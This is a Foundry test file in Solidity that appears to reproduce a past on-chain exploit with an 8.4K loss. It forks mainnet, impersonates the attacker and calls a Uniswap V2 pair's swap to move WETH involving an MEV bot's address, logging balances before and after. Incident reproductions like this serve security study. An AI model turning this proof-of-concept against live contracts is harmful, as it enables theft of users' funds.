pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 8.4K
// Attacker : 
// Attack Contract : 
// Vulnerable Contract : 
// Attack Tx : https://etherscan.io/tx/0x5e151627dc06ec4f2db5be2f48248f320ad3450aba42b1bbd00131bcbaa4f0ae

// @Info
// Vulnerable Contract Code : 

// @Analysis
// Post-mortem : https://x.com/TenArmorAlert/status/1854702463737380958
// Twitter Guy : https://x.com/TenArmorAlert/status/1854702463737380958
// Hacking God : N/A

address constant weth9 = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
address constant attacker = 0x080086911D8c78008800FAE75871a657b77d0082;
address constant mev = 0x0000E0Ca771e21bD00057F54A68C30D400000000;
address constant univ2 = 0x8Cc0c46000A6a4097F9C62293CE62eE5B81E6dfd;

contract ContractTest is Test {
    function setUp() public {
        vm.createSelectFork("mainnet", 21138659);
    }
    
    function testPoC() public {
        vm.startPrank(attacker, attacker);
        deal(weth9, address(univ2), 3208323423502347412);
        emit log_named_decimal_uint("before attack: balance of mev", IERC20(weth9).balanceOf(mev), 18);
        IUniswapV2Pair(univ2).swap(2903872687851807969, 0, address(mev), "");
        emit log_named_decimal_uint("after attack: balance of mev", IERC20(weth9).balanceOf(mev), 18);
        vm.stopPrank();
    }
}